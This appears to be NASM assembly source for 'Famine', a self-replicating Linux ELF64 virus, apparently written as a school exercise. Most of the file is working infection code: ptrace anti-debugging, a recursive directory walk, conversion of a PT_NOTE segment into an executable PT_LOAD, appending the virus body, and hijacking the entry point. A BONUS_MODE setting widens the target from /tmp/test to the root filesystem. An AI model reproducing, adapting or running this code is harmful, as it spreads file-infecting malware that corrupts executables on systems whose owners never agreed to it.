; ============================================
; VIRUS PAYLOAD - The part that gets executed in infected binaries
; This section contains everything needed for the virus to run
; All data is embedded in code and all buffers are stack-allocated
; ============================================

virus_start:
; Original entry point storage (patched during infection)
original_entry_storage:
    dq 0                        ; 8 bytes for original entry point

_start:
    ; Save all registers we'll use
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    push r14
    push r15

    ; ============================================
    ; ANTI-DEBUGGING CHECK
    ; Use ptrace(PTRACE_TRACEME) to detect debugger
    ; Returns -1 (EPERM) if already being traced
    ; ============================================
    mov eax, SYS_PTRACE
    mov edi, PTRACE_TRACEME
    xor esi, esi
    xor edx, edx
    xor r10d, r10d
    syscall
    
    ; If ptrace returns -1, we're being debugged
    cmp rax, -1
    je .being_debugged

    ; Get base address using RIP-relative call trick
    call .get_base
.get_base:
    pop r15                     ; r15 = address of .get_base label
    sub r15, .get_base - virus_start  ; r15 = base address of virus_start

    ; Check if original_entry_storage is 0 (we're the original Famine binary)
    mov rax, [r15 + original_entry_storage - virus_start]
    test rax, rax
    jnz .run_as_virus           ; if not zero, we're running as virus in infected binary

    ; ===== ORIGINAL FAMINE BINARY EXECUTION PATH =====
    ; When running as original famine binary, use normal data sections
    mov qword [rel file_count], 0
    
    mov rsi, firstDir           ; source = /tmp/test
    lea rdi, [rel path_buffer]
    call print_string
    call str_copy
    lea rdi, [rel path_buffer]
    call list_files_recursive
    
    lea rdi, [rel file_list]
    mov rsi, [rel file_count]
    call check_elf64_exec
    
    jmp _end

.being_debugged:
    ; Print "DEBUGGING.." message
    mov eax, SYS_WRITE
    mov edi, STDOUT
    lea rsi, [rel msg_debugging]
    mov edx, 12                 ; length of "DEBUGGING..\n" (without null terminator)
    syscall
    
    ; Exit the program
    mov eax, SYS_EXIT
    xor edi, edi                ; exit code 0
    syscall

.run_as_virus:
    ; ===== VIRUS EXECUTION PATH IN INFECTED BINARY =====
    ; We're running as the virus payload in an infected binary
    ; We need to use stack-based buffers and position-independent code
    
    ; The stored value is the offset from our _start to the original entry
    ; Calculate actual original entry: current_rip + stored_offset
    ; Get current location of _start
    call .get_start_rip
.get_start_rip:
    pop rax                     ; rax = address of .get_start_rip
    sub rax, .get_start_rip - _start  ; rax = actual address of _start
    
    ; Add the stored offset to get original entry
    add rax, [r15 + original_entry_storage - virus_start]
    push rax                    ; save original entry point at bottom of our stack
    
    ; Allocate stack space for our buffers
    sub rsp, VIRUS_STACK_SIZE
    and rsp, ~15                ; 16-byte align

    ; For simplicity in virus mode, just do a minimal infection attempt
    ; Initialize file_count on stack
    mov qword [rsp], 0
    
    ; Build path on stack: "/tmp/test"
    lea rdi, [rsp + 8]          ; path buffer
    lea rsi, [r15 + v_firstDir - virus_start]  ; virus embedded string
    call str_copy
    
    ; List files in directory
    lea rdi, [rsp + 8]          ; path buffer
    lea rsi, [rsp]              ; file count pointer
    lea rdx, [rsp + 4104]       ; file list buffer
    call virus_list_and_infect

    ; Restore to original stack frame
    mov rsp, rbp
    
    ; Pop original entry point into rax
    ; Stack layout from rbp: [saved_rbp][rbx][r12][r13][r14][r15][orig_entry]
    ; rbp points to saved_rbp, so orig_entry is at rbp-48 (6 items * 8 bytes)
    mov rax, [rbp - 48]         ; get original entry point we pushed earlier
    
    ; Restore stack properly - just restore to the value at function entry
    pop rbp                     ; restore original rbp
    
    ; Clear registers to provide clean state (like kernel does)
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx
    xor rcx, rcx
    xor r8, r8
    xor r9, r9
    xor r10, r10
    xor r11, r11
    ; Don't clear rsp, rbp, or rax (entry point)
    
    ; Jump to original entry point
    jmp rax

; ============================================
; Embedded virus strings (in code section for position independence)
; ============================================
%ifdef BONUS_MODE
v_firstDir:       db "/", 0
%else
v_firstDir:       db "/tmp/test", 0
%endif
v_signature:      db "Famine version 1.0 (c)oded by <ocrossi>-<elaignel>", 0
v_signature_len:  equ $ - v_signature - 1


; ============================================
; virus_search_signature - Search for signature in buffer
; rdi = haystack (buffer to search in)
; rsi = haystack_len (length of buffer)
; rdx = needle (string to search for)
; rcx = needle_len (length of needle)
; Returns: rax = 1 if found, 0 if not found
; Position-independent version for virus payload
; ============================================
virus_search_signature:
    push rbp
    mov rbp, rsp
    push r12                    ; haystack
    push r13                    ; haystack_len
    push r14                    ; needle
    push rbx                    ; current position

    mov r12, rdi                ; r12 = haystack
    mov r13, rsi                ; r13 = haystack_len
    mov r14, rdx                ; r14 = needle
    ; rcx already has needle_len

    ; If needle is longer than haystack, not found
    cmp rcx, r13
    ja .vss_not_found

    xor rbx, rbx                ; rbx = current position in haystack

.vss_loop:
    ; Check if we have enough bytes left
    mov rax, r13
    sub rax, rbx                ; bytes remaining
    cmp rax, rcx
    jb .vss_not_found           ; not enough bytes left

    ; Compare needle with current position in haystack
    push rcx                    ; save needle_len
    lea rdi, [r12 + rbx]        ; current position in haystack
    mov rsi, r14                ; needle
    
    ; Byte-by-byte comparison
    xor rax, rax                ; match counter
.vss_compare_loop:
    cmp rax, rcx
    jge .vss_found              ; all bytes matched

    mov r8b, [rdi + rax]        ; byte from haystack
    mov r9b, [rsi + rax]        ; byte from needle
    cmp r8b, r9b
    jne .vss_next               ; mismatch, try next position

    inc rax
    jmp .vss_compare_loop

.vss_next:
    pop rcx                     ; restore needle_len
    inc rbx                     ; try next position
    jmp .vss_loop

.vss_found:
    pop rcx                     ; restore needle_len
    mov rax, 1                  ; found
    jmp .vss_done

.vss_not_found:
    xor rax, rax                ; not found

.vss_done:
    pop rbx
    pop r14
    pop r13
    pop r12
    mov rsp, rbp
    pop rbp
    ret

; ============================================
; virus_list_and_infect - List files and infect ELF64 executables
; rdi = path buffer
; rsi = file count pointer
; rdx = file list buffer
; r15 = virus base address (preserved)
; ============================================
virus_list_and_infect:
    push rbp
    mov rbp, rsp
    sub rsp, 4224               ; stack space for getdents buffer and local vars
    push r12                    ; path buffer
    push r13                    ; file count ptr
    push r14                    ; file list ptr
    push rbx

    mov r12, rdi                ; save path buffer
    mov r13, rsi                ; save file count ptr  
    mov r14, rdx                ; save file list ptr

    ; Get path length
    mov rdi, r12
    call str_len
    mov [rbp-8], rax            ; save path length

    ; Open directory
    mov eax, SYS_OPENAT
    mov edi, AT_FDCWD
    mov rsi, r12
    mov edx, O_RDONLY | O_DIRECTORY
    xor r10d, r10d
    syscall

    test rax, rax
    js .vl_done

    mov rbx, rax                ; save fd

.vl_read_loop:
    ; getdents64
    mov eax, SYS_GETDENTS64
    mov edi, ebx
    lea rsi, [rbp-4224]         ; buffer on stack
    mov edx, 4096
    syscall

    test rax, rax
    jle .vl_close_dir

    mov [rbp-16], rax           ; save nread
    mov qword [rbp-24], 0       ; pos = 0

.vl_process_entry:
    mov rax, [rbp-24]
    cmp rax, [rbp-16]
    jge .vl_read_loop

    lea rdi, [rbp-4224]
    add rdi, rax                ; dirent pointer

    ; Get d_reclen (offset 16)
    movzx ecx, word [rdi + 16]
    mov [rbp-32], rcx           ; save d_reclen

    ; Get d_type (offset 18)
    movzx eax, byte [rdi + 18]

    ; Get d_name (offset 19)
    lea rsi, [rdi + 19]

    ; Skip . and ..
    cmp byte [rsi], '.'
    jne .vl_not_dot
    cmp byte [rsi+1], 0
    je .vl_next_entry
    cmp byte [rsi+1], '.'
    jne .vl_not_dot
    cmp byte [rsi+2], 0
    je .vl_next_entry

.vl_not_dot:
    ; Check if regular file (DT_REG = 8)
    cmp al, 8
    jne .vl_next_entry

    ; Build full path
    mov rdi, r12
    mov rax, [rbp-8]            ; path length
    add rdi, rax

    ; Add / if needed
    cmp byte [rdi-1], '/'
    je .vl_no_slash
    mov byte [rdi], '/'
    inc rdi
.vl_no_slash:
    ; rsi already points to d_name
    push rdi
    call str_copy
    pop rdi

    ; Try to infect this file
    mov rdi, r12
    call virus_infect_elf

    ; Restore path
    mov rax, [rbp-8]
    mov byte [r12 + rax], 0

.vl_next_entry:
    mov rax, [rbp-24]
    add rax, [rbp-32]
    mov [rbp-24], rax
    jmp .vl_process_entry

.vl_close_dir:
    mov eax, SYS_CLOSE
    mov edi, ebx
    syscall

.vl_done:
    pop rbx
    pop r14
    pop r13
    pop r12
    add rsp, 4224
    mov rsp, rbp
    pop rbp
    ret

; ============================================
; virus_infect_elf - Try to infect an ELF64 file
; rdi = file path
; r15 = virus base address (preserved)
; ============================================
virus_infect_elf:
    push rbp
    mov rbp, rsp
    sub rsp, 4096 + 128         ; Buffer for ELF header, phdrs, and local vars
    push r12                    ; file path
    push r13                    ; file descriptor
    push r14                    ; e_phoff
    push rbx

    mov r12, rdi

    ; Open file for read/write
    mov eax, SYS_OPENAT
    mov edi, AT_FDCWD
    mov rsi, r12
    mov edx, O_RDWR
    xor r10d, r10d
    syscall

    test rax, rax
    js .vi_fail

    mov r13, rax                ; fd

    ; Get file size
    mov eax, SYS_LSEEK
    mov edi, r13d
    xor esi, esi
    mov edx, SEEK_END
    syscall

    test rax, rax
    js .vi_close_fail

    mov [rbp-8], rax            ; save file size

    ; Seek to beginning
    mov eax, SYS_LSEEK
    mov edi, r13d
    xor esi, esi
    xor edx, edx
    syscall

    ; Read ELF header
    mov eax, SYS_READ
    mov edi, r13d
    lea rsi, [rbp-112]          ; ELF header buffer
    mov edx, 64
    syscall

    cmp rax, 64
    jl .vi_handle_non_elf

    ; Check ELF magic
    lea rdi, [rbp-112]
    cmp dword [rdi], 0x464c457f ; "\x7fELF"
    jne .vi_handle_non_elf

    ; Check ELF class (must be 64-bit)
    cmp byte [rdi+4], 2
    jne .vi_handle_non_elf

    ; Check e_type (2=ET_EXEC or 3=ET_DYN)
    movzx eax, word [rdi+16]
    cmp ax, 2
    je .vi_valid_elf_type
    cmp ax, 3
    jne .vi_handle_non_elf

.vi_valid_elf_type:
    ; ============================================
    ; Check if file is already infected by searching for signature
    ; ============================================
    ; We need to scan the file for the signature before infecting
    ; Use [rbp-4224] as a temporary read buffer (will be reused for phdrs later)
    
    mov [rbp-48], r15           ; save r15 (virus base) temporarily
    
    ; Seek to beginning
    mov eax, SYS_LSEEK
    mov edi, r13d
    xor esi, esi
    xor edx, edx
    syscall
    
    xor rbx, rbx                ; current file position
    mov r14, [rbp-8]            ; file size

.vi_sig_check_loop:
    ; Read a chunk of the file
    mov eax, SYS_READ
    mov edi, r13d
    lea rsi, [rbp-4224]         ; buffer
    mov edx, 4096               ; read up to 4096 bytes
    syscall

    test rax, rax
    jle .vi_sig_check_done      ; EOF or error, not found

    ; Search for signature in buffer
    push rax                    ; save bytes_read
    mov r15, [rbp-48]           ; restore r15 for signature access
    lea rdi, [rbp-4224]         ; buffer
    mov rsi, rax                ; bytes_read
    lea rdx, [r15 + v_signature - virus_start]  ; signature
    mov rcx, v_signature_len    ; signature length
    call virus_search_signature
    
    pop rcx                     ; restore bytes_read into rcx
    
    ; If found, file is already infected
    test rax, rax
    jnz .vi_already_infected

    ; Update position and check if more to read
    add rbx, rcx                ; bytes read
    cmp rbx, r14                ; compare with file size
    jge .vi_sig_check_done      ; done reading

    ; Seek back slightly to handle signatures that span chunk boundaries
    mov rsi, rbx
    sub rsi, v_signature_len
    add rsi, 1
    test rsi, rsi
    js .vi_sig_check_done       ; shouldn't happen, but be safe
    
    mov eax, SYS_LSEEK
    mov edi, r13d
    xor edx, edx                ; SEEK_SET
    syscall
    
    test rax, rax
    js .vi_sig_check_done
    
    mov rbx, rax                ; update position
    jmp .vi_sig_check_loop

.vi_already_infected:
    ; File is already infected, just close and skip
    mov r15, [rbp-48]           ; restore r15
    jmp .vi_close_fail

.vi_sig_check_done:
    ; File is not infected, proceed with infection
    mov r15, [rbp-48]           ; restore r15
    
    ; Seek back to beginning to read ELF header again
    mov eax, SYS_LSEEK
    mov edi, r13d
    xor esi, esi
    xor edx, edx
    syscall
    
    ; Read ELF header again
    mov eax, SYS_READ
    mov edi, r13d
    lea rsi, [rbp-112]          ; ELF header buffer
    mov edx, 64
    syscall
    
    ; Re-setup ELF header pointer
    lea rdi, [rbp-112]

    ; Save original entry point
    mov rax, [rdi + 24]         ; e_entry at offset 24
    mov [rbp-16], rax

    ; Get e_phoff
    mov r14, [rdi + 32]         ; e_phoff at offset 32

    ; Get e_phentsize
    movzx eax, word [rdi + 54]
    mov [rbp-32], rax

    ; Get e_phnum
    movzx eax, word [rdi + 56]
    mov [rbp-40], rax

    ; Seek to program headers
    mov eax, SYS_LSEEK
    mov edi, r13d
    mov rsi, r14
    xor edx, edx
    syscall

    ; Read all program headers
    mov rax, [rbp-40]           ; e_phnum
    imul rax, [rbp-32]          ; * e_phentsize
    mov rdx, rax

    mov eax, SYS_READ
    mov edi, r13d
    lea rsi, [rbp-4224]         ; phdr buffer
    syscall

    ; Find PT_NOTE to convert to PT_LOAD
    lea rdi, [rbp-4224]
    xor rcx, rcx                ; index
    mov rax, [rbp-40]           ; e_phnum

.vi_find_note:
    cmp rcx, rax
    jge .vi_close_fail          ; No PT_NOTE found

    mov rdx, rcx
    imul rdx, [rbp-32]          ; * e_phentsize
    lea rsi, [rdi + rdx]

    cmp dword [rsi], PT_NOTE    ; p_type
    je .vi_found_note

    inc rcx
    jmp .vi_find_note

.vi_found_note:
    ; rsi points to the PT_NOTE phdr
    ; First, we need to find the highest vaddr in existing LOAD segments
    ; Save rsi (pointer to PT_NOTE phdr) on stack
    push rsi
    
    ; Scan all phdrs to find max vaddr + memsz
    lea rdi, [rbp-4224]         ; phdrs buffer
    xor rcx, rcx                ; index
    xor r8, r8                  ; max_vaddr_end = 0
    mov rax, [rbp-40]           ; e_phnum

.vi_find_max_vaddr:
    cmp rcx, rax
    jge .vi_found_max_vaddr

    mov rdx, rcx
    imul rdx, [rbp-32]          ; * e_phentsize
    lea rsi, [rdi + rdx]

    ; Check if this is a LOAD segment
    cmp dword [rsi], PT_LOAD
    jne .vi_next_phdr

    ; Get vaddr + memsz
    mov r9, [rsi+16]            ; p_vaddr
    add r9, [rsi+40]            ; + p_memsz
    cmp r9, r8
    jle .vi_next_phdr
    mov r8, r9                  ; update max

.vi_next_phdr:
    inc rcx
    jmp .vi_find_max_vaddr

.vi_found_max_vaddr:
    ; r8 now contains the highest vaddr + memsz
    ; We need p_vaddr to be congruent to p_offset modulo page size
    ; p_offset = file_size, so: p_vaddr % 0x1000 == file_size % 0x1000
    
    ; First, get the file size's page offset
    mov rax, [rbp-8]            ; file size
    mov r9, rax                 ; save file size in r9
    and rax, 0xfff              ; file_size % page_size
    
    ; Align r8 (max_vaddr_end) up to next page boundary, then add the offset
    add r8, 0xfff
    and r8, ~0xfff              ; page-aligned
    add r8, rax                 ; add file offset within page
    
    ; Restore rsi (pointer to PT_NOTE phdr)
    pop rsi
    
    ; Convert to PT_LOAD
    mov dword [rsi], PT_LOAD    ; p_type
    mov dword [rsi+4], PF_R | PF_W | PF_X  ; p_flags

    ; p_offset = file size
    mov [rsi+8], r9             ; use saved file size

    ; p_vaddr = properly aligned value in r8
    mov [rsi+16], r8            ; p_vaddr
    mov [rsi+24], r8            ; p_paddr
    mov [rbp-24], r8            ; save for later

    ; p_filesz and p_memsz = virus size
    mov rax, virus_end - virus_start
    mov [rsi+32], rax           ; p_filesz
    mov [rsi+40], rax           ; p_memsz

    ; p_align = 0x1000
    mov qword [rsi+48], 0x1000

    ; Write modified phdrs back
    mov eax, SYS_LSEEK
    mov edi, r13d
    mov rsi, r14                ; e_phoff
    xor edx, edx
    syscall

    mov rax, [rbp-40]           ; e_phnum
    imul rax, [rbp-32]          ; * e_phentsize
    mov rdx, rax

    mov eax, SYS_WRITE
    mov edi, r13d
    lea rsi, [rbp-4224]
    syscall

    ; Update entry point
    mov rax, [rbp-24]           ; new vaddr
    add rax, _start - virus_start  ; offset to _start
    lea rdi, [rbp-112]
    mov [rdi + 24], rax         ; e_entry

    ; Write updated ELF header
    mov eax, SYS_LSEEK
    mov edi, r13d
    xor esi, esi
    xor edx, edx
    syscall

    mov eax, SYS_WRITE
    mov edi, r13d
    lea rsi, [rbp-112]
    mov edx, 64
    syscall

    ; Prepare virus copy with patched original entry
    ; Copy virus to temp buffer
    lea rdi, [rbp-4224]
    mov rsi, r15                ; virus_start address
    mov rcx, virus_end - virus_start
.vi_copy_virus:
    test rcx, rcx
    jz .vi_copy_done
    mov al, [rsi]
    mov [rdi], al
    inc rsi
    inc rdi
    dec rcx
    jmp .vi_copy_virus

.vi_copy_done:
    ; Patch original_entry_storage
    ; For PIE binaries, we store the offset from our _start to the original entry
    ; This way, at runtime: actual_original_entry = our_rip + stored_offset
    lea rdi, [rbp-4224]
    mov rax, [rbp-16]           ; original entry point (offset)
    mov rcx, [rbp-24]           ; our new vaddr
    add rcx, _start - virus_start  ; add offset to _start
    sub rax, rcx                ; offset = original_entry - our_entry
    mov [rdi + original_entry_storage - virus_start], rax

    ; Seek to end of file
    mov eax, SYS_LSEEK
    mov edi, r13d
    xor esi, esi
    mov edx, SEEK_END
    syscall

    ; Write virus code
    mov eax, SYS_WRITE
    mov edi, r13d
    lea rsi, [rbp-4224]
    mov edx, virus_end - virus_start
    syscall

    ; Close file
    mov eax, SYS_CLOSE
    mov edi, r13d
    syscall

    jmp .vi_done

; ============================================
; Handle non-ELF files - check for signature and append if not present
; ============================================
.vi_handle_non_elf:
    ; File is not a valid ELF64 executable
    ; Check if it already contains the signature
    ; Seek to beginning
    mov eax, SYS_LSEEK
    mov edi, r13d
    xor esi, esi
    xor edx, edx
    syscall
    
    xor rbx, rbx                ; current file position
    mov r14, [rbp-8]            ; file size

.vi_non_elf_sig_loop:
    ; Read a chunk of the file
    mov eax, SYS_READ
    mov edi, r13d
    lea rsi, [rbp-4224]         ; buffer on stack
    mov edx, 4096
    syscall

    test rax, rax
    jle .vi_non_elf_append      ; EOF or error, signature not found

    ; Search for signature in buffer
    push rax                    ; save bytes_read
    lea rdi, [rbp-4224]         ; buffer
    mov rsi, rax                ; bytes_read
    lea rdx, [r15 + v_signature - virus_start]  ; signature
    mov rcx, v_signature_len    ; signature length
    call virus_search_signature
    
    pop rcx                     ; restore bytes_read into rcx
    
    ; If found, file already has signature
    test rax, rax
    jnz .vi_close_fail          ; skip - already has signature

    ; Update position and check if more to read
    add rbx, rcx                ; bytes read
    cmp rbx, r14                ; compare with file size
    jge .vi_non_elf_append      ; done reading, append signature

    ; Seek back slightly to handle signatures that span chunk boundaries
    mov rsi, rbx
    sub rsi, v_signature_len
    add rsi, 1
    test rsi, rsi
    js .vi_non_elf_append       ; shouldn't happen, but be safe
    
    mov eax, SYS_LSEEK
    mov edi, r13d
    xor edx, edx                ; SEEK_SET
    syscall
    
    test rax, rax
    js .vi_non_elf_append
    
    mov rbx, rax                ; update position
    jmp .vi_non_elf_sig_loop

.vi_non_elf_append:
    ; Append the signature to the file
    ; Seek to end of file
    mov eax, SYS_LSEEK
    mov edi, r13d
    xor esi, esi
    mov edx, SEEK_END
    syscall
    
    ; Write the signature
    mov eax, SYS_WRITE
    mov edi, r13d
    lea rsi, [r15 + v_signature - virus_start]
    mov edx, v_signature_len
    syscall
    
    ; Close file and done
    jmp .vi_close_fail

.vi_close_fail:
    mov eax, SYS_CLOSE
    mov edi, r13d
    syscall

.vi_fail:
.vi_done:
    pop rbx
    pop r14
    pop r13
    pop r12
    add rsp, 4096 + 128
    mov rsp, rbp
    pop rbp
    ret

; ============================================
; VIRUS CODE END
; ============================================
virus_end:
